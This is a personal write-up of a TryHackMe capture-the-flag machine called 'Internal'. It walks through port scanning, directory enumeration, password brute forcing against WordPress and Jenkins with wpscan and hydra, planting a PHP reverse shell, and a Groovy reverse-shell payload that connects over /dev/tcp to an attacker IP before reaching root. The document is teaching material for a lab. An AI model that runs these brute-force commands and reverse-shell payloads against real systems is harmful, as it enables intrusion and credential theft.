Let's solve the machine: **Internal** available on [TryHackMe](https://tryhackme.com).  

## Introduction
First of all this is my first writeup after solving a machine. I solved a few of TryHackMe machines before, but these were all a lot more guided and easier and without any rabbit holes (or at least I did not find them).

I hope it helps you to solve this machine like it helped me to read Writeups.
Before working with the machine, add an entry to your `/etc/hosts` mapping the IP (in my case `10.10.190.47`) to `internal.thm`.

## Recon
I started throwing nmap on the target. With a complete scan with `nmap -A internal.thm` I saw two open ports, 22 and 80.

```
Nmap scan report for internal.thm (10.10.190.47)
Host is up (0.00062s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:9B:4D:A7:14:0D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

With the `nmap internal.thm --script vuln` command I tried to find some general known vulnerabilities in the services, but without success.

## Enumeration
Then I used gobuster to look for some known directories:
`gobuster dir -u 10.10.190.47 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt`

I found three potentially interesting directories:
```
/blog (Status: 301)
/wordpress (Status: 301)
/phpmyadmin (Status: 301)
```

I decided to try out finding some information about wordpress first. You may also notice that blog and wordpress are pointing to the same application.
Opening the page on `internal.thm/blog` I saw the default installation of WordPress.

### WordPress Enumeration
Knowing that a default WordPress login is accessible via `/blog/wp-admin.php`, I navigated to that page and tested out some credentials.

Wild guessing the user might be `admin`, WordPress told me the password for that user was wrong. 
On the other hand: If I used another, non-existing user, WordPress told me `Uknown username`. 
So now I know `admin` is an existing user, nice!

Let's use another tool from our toolchain: **wpscan**. WPScan has a lot of useful parameters. Using the following command, we can find the password for the admin:
`wpscan --url http://internal.thm/wordpress --usernames 'admin' --passwords /usr/share/wordlists/rockyou.txt`

After a few seconds I found the password for the admin user and few further details.

## Accessing the System and gaining shell access
After logging in I decided to not install a reverse shell plugin, but to include a PHP reverse shell from pentestmonkey into the `404.php` page.

On my system I waited for a connection via `nc -nlvp 1234`.

After opening a random page on the blog, the session opened and I could get shell access.

Looking into `/home`-dir, I found an user `aubreanna`. I could access the user's home dir.

But we know from before that there is also a `phpmyadmin`-instance which is by default placed under `/etc/phpmyadmin`. Via catting the `config-db.php`, I could find the default password for the phpmyadmin-user.

After searching some time for further infos I got a bit stuck. No infos could be found here, no user information etc.

Before looking for further infos, I found an article on WordPress called _Private_. Credentials for the user william were there.
I hoped it was some more-privileged user for SSH but via `cat /etc/passwd` I could verify there is no user with the username `william`. 

Without finding further information, I checked `/opt`-directory since I usually put my apps here and found an maybe interesting file: `wp-save.txt`.

And luckily I found some credentials for aubreanna! :)

![](https://i.imgur.com/Ijbnsya.png)

After using these credentials I was able to find the `user.txt` in the *aubreanna's* home directory and found a flag here. :)

## Privilege Escalation
Next hint in aubreanna's directory was the `jenkins.txt`.
But actually I could see that this Jenkins instance is on another network. I used an SSH tunnel to access this network via the `internal.thm`:

```bash
ssh -L 8888:172.17.0.2:8080 -l aubreanna internal.thm
```
`localhost:8888` showed me the Jenkins login page. I tried to use the credentials exposed on WordPress, but that did not work. 
Maybe I could find something with hydra.

![](https://i.imgur.com/N3SodUC.png)

But which user should I take? After having a short research on that, I found out there might be an `admin` user by default.
With Hydra and a little help of my network console, I saw three things I need for cracking the password:

```
File: /j_acegi_security_check
Request Body: j_username=admin&j_password=admin&from=%2F&Submit=Sign+in
```
Addtionally I know the error when login does not succeed: _Invalid username or password_
So I could construct the hydra-command and replace user and pw with placeholders:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Using this command we found the password for our admin user.

From [this](https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/) site, we can now gain the information of how we can create a reverse shell from Jenkins Script Console (which can be found in Jenkins->Node->master->Script Console):
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.7.212/4321;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

After listening for this via `nc -nlvp 4321`, we are again on another machine.
Guessing to see again some useful info in `/opt`, I check the directory and: quel surprise: we can find a `note.txt`.

![](https://i.imgur.com/pURMR8X.png)

As we can see, we find some relevant info here. ;) 
Let's login to `internal.thm `as root and capture our root-flag.
